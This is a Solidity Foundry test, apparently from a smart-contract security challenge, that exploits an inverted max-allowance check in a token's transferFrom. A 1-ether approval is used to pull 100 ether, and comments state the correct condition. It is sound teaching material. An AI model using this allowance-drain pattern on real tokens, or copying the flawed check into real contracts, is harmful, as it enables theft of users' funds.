// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {BaseTest} from "./utils/BaseTest.t.sol";
import {Challenge14} from "src/Challenge14.sol";

contract CounterTest is BaseTest {
    MockToken mockToken;

    function setUp() public {
        mockToken = new MockToken();
    }

    function test_WrongAllowanceDecrementInTransferFrom() public {
        uint256 amount = 100 ether;

        mockToken.mint(deployer, amount);

        mockToken.approve(random, 1 ether);

        for (uint256 i; i < 100; i++) {
            vm.prank(random);

            // if (allowed == type(uint256).max) is incorrect
            // it should be if (allowed != type(uint256).max)
            mockToken.transferFrom(deployer, random, 1 ether);
        }

        assertEq(amount, mockToken.balanceOf(random));
    }
}

contract MockToken is Challenge14 {
    constructor() Challenge14("Challenge14", "Ch14", 18) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}
